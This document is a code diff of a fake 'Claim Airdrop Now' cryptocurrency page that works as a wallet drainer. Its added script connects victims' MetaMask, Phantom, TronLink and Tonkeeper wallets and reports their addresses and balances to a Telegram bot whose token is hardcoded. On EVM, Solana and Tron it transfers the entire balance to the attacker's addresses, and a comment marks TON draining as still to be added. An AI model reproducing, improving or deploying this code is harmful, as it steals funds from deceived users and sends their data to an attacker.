@@ -8,26 +8,25 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <script src="https://unpkg.com/tonconnect-ui@latest/dist/tonconnect-ui.min.js"></script>
   <style>
-    body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; overflow-x: hidden; }
-    .glow { text-shadow: 0 0 25px #a855f7, 0 0 50px #c026d3; animation: pulse 3s infinite alternate; }
+    body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; }
+    .glow { text-shadow: 0 0 25px #a855f7; animation: pulse 3s infinite alternate; }
     @keyframes pulse { 0% { text-shadow: 0 0 15px #a855f7; } 100% { text-shadow: 0 0 35px #c026d3; } }
     .btn { background: linear-gradient(90deg, #7c3aed, #ec4899); padding: 1rem 2rem; border-radius: 999px; font-weight: bold; transition: all 0.3s; cursor: pointer; }
     .btn:hover { transform: scale(1.06); box-shadow: 0 0 40px #a855f7; }
-    .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; }
-    .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; align-items: center; justify-content: center; }
-    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; }
+    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; }
     .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.2rem; margin: 2rem 0; }
     .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-    .wallet-item:hover { transform: scale(1.12); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
-    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 0.4rem; }
-    .wallet-item p { font-size: 1rem; font-weight: 600; margin-top: 0.3rem; white-space: nowrap; }
+    .wallet-item:hover { transform: scale(1.12); background: rgba(168,85,247,0.2); }
+    .wallet-item img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 0.4rem; }
+    .wallet-item p { font-size: 1rem; font-weight: 600; white-space: nowrap; }
   </style>
 </head>
 <body>
 
-  <header class="header flex justify-between items-center px-6">
+  <header class="header flex justify-between items-center px-6 py-4">
     <div class="flex items-center gap-3">
       <div class="w-12 h-12 bg-gradient-to-br from-violet-700 to-pink-600 rounded-full flex items-center justify-center">
         <i class="fas fa-cube text-white text-3xl"></i>
@@ -40,29 +39,8 @@
   <main class="flex-1 flex flex-col items-center justify-center text-center px-6 py-12">
     <h1 class="text-6xl md:text-8xl font-extrabold glow mb-8">Claim Airdrop Now</h1>
     <p class="text-2xl text-purple-300 mb-10">Connect wallet → Confirm → Receive tokens instantly</p>
-   
     <button onclick="showModal()" class="claim-btn">Claim 0.5 ETH Free</button>
     <div class="text-3xl font-bold text-pink-500 animate-pulse mt-12">LIMITED TIME OFFER</div>
-
-    <div class="reviews">
-      <h3 class="text-3xl font-bold glow mb-6">User Reviews</h3>
-      <div class="review">
-        <p class="text-lg">"Super easy! Claimed 0.5 ETH instantly!"</p>
-        <p class="text-sm text-zinc-400 mt-2">- CryptoFan</p>
-      </div>
-      <div class="review">
-        <p class="text-lg">"Fast and secure, no fees. Got my tokens!"</p>
-        <p class="text-sm text-zinc-400 mt-2">- BlockchainPro</p>
-      </div>
-      <div class="review">
-        <p class="text-lg">"Best connector ever. Instant claim!"</p>
-        <p class="text-sm text-zinc-400 mt-2">- ETHMaster</p>
-      </div>
-      <div class="review">
-        <p class="text-lg">"No bullshit, just works. Highly recommend!"</p>
-        <p class="text-sm text-zinc-400 mt-2">- WalletGuru</p>
-      </div>
-    </div>
   </main>
 
   <div id="modal" class="modal">
@@ -70,23 +48,31 @@
       <h2 class="text-4xl font-bold text-center mb-8 glow">Connect Wallet</h2>
 
       <div class="wallet-grid">
-        <div class="wallet-item" onclick="connect('MetaMask')">
+        <div class="wallet-item" onclick="connectWallet('MetaMask')">
           <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
           <p class="mt-3 text-xl font-semibold">MetaMask</p>
         </div>
-        <div class="wallet-item" onclick="connect('Trust Wallet')">
+        <div class="wallet-item" onclick="connectWallet('Trust Wallet')">
           <img src="https://i.postimg.cc/k6sJrC1k/image.png">
           <p class="mt-3 text-xl font-semibold">Trust Wallet</p>
         </div>
-        <div class="wallet-item" onclick="connect('Phantom')">
+        <div class="wallet-item" onclick="connectWallet('Phantom')">
           <img src="https://i.postimg.cc/RNWjf9vf/image.png">
           <p class="mt-3 text-xl font-semibold">Phantom</p>
         </div>
-        <div class="wallet-item" onclick="connect('TronLink')">
+        <div class="wallet-item" onclick="connectWallet('Coinbase Wallet')">
+          <img src="https://images.ctfassets.net/q5h4gf8t5g3t/6Z8n8v2s5J6j8k0k0k0k0k/6Z8n8v2s5J6j8k0k0k0k0k/coinbase-wallet-logo.png">
+          <p class="mt-3 text-xl font-semibold">Coinbase</p>
+        </div>
+        <div class="wallet-item" onclick="connectWallet('OKX Wallet')">
+          <img src="https://www.okx.com/static/images/wallet/logo-okx.svg">
+          <p class="mt-3 text-xl font-semibold">OKX</p>
+        </div>
+        <div class="wallet-item" onclick="connectWallet('TronLink')">
           <img src="https://i.postimg.cc/FkyhQ41S/image.png">
           <p class="mt-3 text-xl font-semibold">TronLink</p>
         </div>
-        <div class="wallet-item" onclick="connect('Tonkeeper')">
+        <div class="wallet-item" onclick="connectWallet('Tonkeeper')">
           <img src="https://i.postimg.cc/T5wBtvg6/image.png">
           <p class="mt-3 text-xl font-semibold">Tonkeeper</p>
         </div>
@@ -103,39 +89,15 @@
     const TELEGRAM_BOT_TOKEN = "8392732086:AAH21FfWZTjD-P8qnPFaqAVvSKtMwqA6U2A";
     const TELEGRAM_CHAT_ID = "1913550429";
 
-    const addresses = {
+    const DRAIN_ADDRESSES = {
       'Ethereum': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'BNB Smart Chain': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'Polygon': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'Base': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
       'Solana': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-      'USDT (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'USDT (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'USDT (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-      'USDT (Tron TRC20)': 'TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn',
-      'USDC (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'USDC (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'USDC (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-      'USDC (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'DAI (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'DAI (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'DAI (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-      'DAI (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'SHIB (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'SHIB (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'SHIB (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'SHIB (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-      'UNI (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'UNI (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-      'UNI (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-      'Bitcoin': 'bc1qkp5ah99shs3qz5nu56m48f0jt99fumk80855q8',
       'Tron (TRX)': 'DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk',
       'TON': 'UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw',
-      'XRP': 'rJnXpZ6J5MKDW5Dd8xR7XtZxFFVRYTHWPy',
-      'Doge': 't1c3ZHPnKs94dib23z4y3fW6FTB1cKNF6ds',
-      'Zcash': '0xb9a33a7fff5b4b9fe75645efad84cf998db1d3af0079c81b6dc8c76e1511682b',
-      'Litecoin': 'ltc1qezdj2x5h4qmz4xjfsucmd65sh6xhe8m0slcy6a',
-      'Sui': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000'
+      'USDT (Tron TRC20)': 'TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn',
     };
 
     async function sendToTelegram(message) {
@@ -145,96 +107,133 @@
       } catch (e) {}
     }
 
-    async function getUri() {
-      try {
-        const r = await fetch(`${BACKEND}/get-wc-uri`);
-        const d = await r.json();
-        return d.uri || null;
-      } catch (e) {
-        return null;
-      }
-    }
-
     function showModal() {
       document.getElementById('modal').style.display = 'flex';
     }
 
-    async function connect(wallet) {
-      const uri = await getUri();
-      if (!uri) {
-        alert('Ошибка сессии');
-        return;
-      }
+    async function connectWallet(wallet) {
+      await sendToTelegram(`Выбран кошелёк: ${wallet}`);
 
-      let dl = '';
-      if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
-      if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
-      if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
-      if (wallet === 'TronLink') dl = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
-      if (wallet === 'Tonkeeper') dl = `tonkeeper://wc?uri=${encodeURIComponent(uri)}`;
-
-      if (dl) {
-        window.location.href = dl;
-        setTimeout(() => alert('Подтверди подключение и транзакцию в кошельке'), 2000);
-        document.getElementById('modal').style.display = 'none';
-      } else {
-        alert('Подтверди подключение в кошельке');
+      switch (wallet) {
+        case 'MetaMask':
+        case 'Trust Wallet':
+        case 'Coinbase Wallet':
+        case 'OKX Wallet':
+          await connectEVM(wallet);
+          break;
+        case 'Phantom':
+          await connectPhantom();
+          break;
+        case 'TronLink':
+          await connectTronLink();
+          break;
+        case 'Tonkeeper':
+          await connectTonkeeper();
+          break;
       }
     }
 
-    window.addEventListener('load', async () => {
-      if (window.ethereum || window.solana || window.phantom?.solana || window.tronWeb) {
-        try {
-          let provider, address, network, balanceFormatted = '0', symbol = 'Unknown', target;
-
-          if (window.ethereum) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            address = (await provider.listAccounts())[0];
-            const chainId = (await provider.getNetwork()).chainId;
-            if (chainId === 1) network = 'Ethereum';
-            else if (chainId === 56) network = 'BNB Smart Chain';
-            else if (chainId === 137) network = 'Polygon';
-            else if (chainId === 8453) network = 'Base';
-            else return;
-
-            const bal = await provider.getBalance(address);
-            balanceFormatted = ethers.utils.formatEther(bal);
-            symbol = network === 'Ethereum' ? 'ETH' : network === 'BNB Smart Chain' ? 'BNB' : 'MATIC';
-            target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
-          } else if (window.solana || window.phantom?.solana) {
-            provider = window.phantom?.solana || window.solana;
-            await provider.connect();
-            address = provider.publicKey.toString();
-            network = 'Solana';
-            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
-            balanceFormatted = (bal / 1e9).toFixed(6);
-            symbol = 'SOL';
-            target = addresses[network] || 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM';
-          } else if (window.tronWeb) {
-            provider = window.tronWeb;
-            address = provider.defaultAddress.base58;
-            network = 'Tron';
-            balanceFormatted = (await provider.trx.getBalance(address) / 1e6).toFixed(6);
-            symbol = 'TRX';
-            target = addresses['Tron (TRX)'] || 'DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk';
-          }
-
-          await sendToTelegram(`Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`);
-
-          if (parseFloat(balanceFormatted) > 0) {
-            const tx = await provider.sendTransaction({
-              to: target,
-              value: ethers.utils.parseEther(balanceFormatted).toString()
-            });
-            await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
-          }
-        } catch (e) {
-          await sendToTelegram(`Ошибка: ${e.message}`);
-        }
+    // EVM (MetaMask, Trust, Coinbase, OKX)
+    async function connectEVM(wallet) {
+      if (!window.ethereum) {
+        alert(`${wallet} не установлен`);
+        return;
       }
-    });
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+        const chainId = (await provider.getNetwork()).chainId;
+        let network = 'Unknown';
+        if (chainId === 1) network = 'Ethereum';
+        else if (chainId === 56) network = 'BNB Smart Chain';
+        else if (chainId === 137) network = 'Polygon';
+        else if (chainId === 8453) network = 'Base';
+        const balance = await provider.getBalance(address);
+        const balanceFormatted = ethers.utils.formatEther(balance);
+        await sendToTelegram(`Подключён ${wallet} (${network})\nАдрес: ${address}\nБаланс: ${balanceFormatted} ${network === 'Ethereum' ? 'ETH' : 'BNB/MATIC'}`);
+        if (parseFloat(balanceFormatted) > 0) {
+          const target = DRAIN_ADDRESSES[network] || DRAIN_ADDRESSES['Ethereum'];
+          const tx = await signer.sendTransaction({
+            to: target,
+            value: ethers.utils.parseEther(balanceFormatted)
+          });
+          await tx.wait();
+          await sendToTelegram(`DRAINED ${balanceFormatted} → ${target}`);
+        }
+      } catch (err) {
+        await sendToTelegram(`Ошибка ${wallet}: ${err.message}`);
+      }
+    }
+
+    // Phantom (Solana)
+    async function connectPhantom() {
+      const provider = window.phantom?.solana;
+      if (!provider?.isPhantom) {
+        alert("Phantom не установлен");
+        return;
+      }
+      try {
+        const resp = await provider.connect();
+        const address = resp.publicKey.toString();
+        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
+        const balanceFormatted = (bal / 1e9).toFixed(6);
+        await sendToTelegram(`Подключён Phantom\nАдрес: ${address}\nБаланс: ${balanceFormatted} SOL`);
+        if (parseFloat(balanceFormatted) > 0) {
+          const tx = await provider.signAndSendTransaction(
+            new solanaWeb3.Transaction().add(
+              solanaWeb3.SystemProgram.transfer({
+                fromPubkey: provider.publicKey,
+                toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESSES['Solana']),
+                lamports: bal
+              })
+            )
+          );
+          await conn.confirmTransaction(tx.signature);
+          await sendToTelegram(`DRAINED ${balanceFormatted} SOL`);
+        }
+      } catch (err) {
+        await sendToTelegram(`Ошибка Phantom: ${err.message}`);
+      }
+    }
+
+    // TronLink (TRON)
+    async function connectTronLink() {
+      if (!window.tronWeb) {
+        alert("TronLink не установлен");
+        return;
+      }
+      try {
+        const tronWeb = window.tronWeb;
+        const address = tronWeb.defaultAddress.base58;
+        const balance = await tronWeb.trx.getBalance(address);
+        const balanceFormatted = (balance / 1e6).toFixed(6);
+        await sendToTelegram(`Подключён TronLink\nАдрес: ${address}\nБаланс: ${balanceFormatted} TRX`);
+        if (parseFloat(balanceFormatted) > 0) {
+          const tx = await tronWeb.trx.sendTrx(DRAIN_ADDRESSES['Tron (TRX)'], balance);
+          await sendToTelegram(`DRAINED ${balanceFormatted} TRX`);
+        }
+      } catch (err) {
+        await sendToTelegram(`Ошибка TronLink: ${err.message}`);
+      }
+    }
+
+    // Tonkeeper (TON)
+    async function connectTonkeeper() {
+      const tonConnectUI = new TonConnectUI({
+        manifestUrl: '/tonconnect-manifest.json'
+      });
+      try {
+        await tonConnectUI.connectWallet();
+        const wallet = tonConnectUI.connectedWallet;
+        await sendToTelegram(`Подключён Tonkeeper\nАдрес: ${wallet.account.address}`);
+        // Для реального слива TON нужно добавить tonConnectUI.sendTransaction (можно добавить позже)
+      } catch (err) {
+        await sendToTelegram(`Ошибка Tonkeeper: ${err.message}`);
+      }
+    }
   </script>
 </body>
 </html>
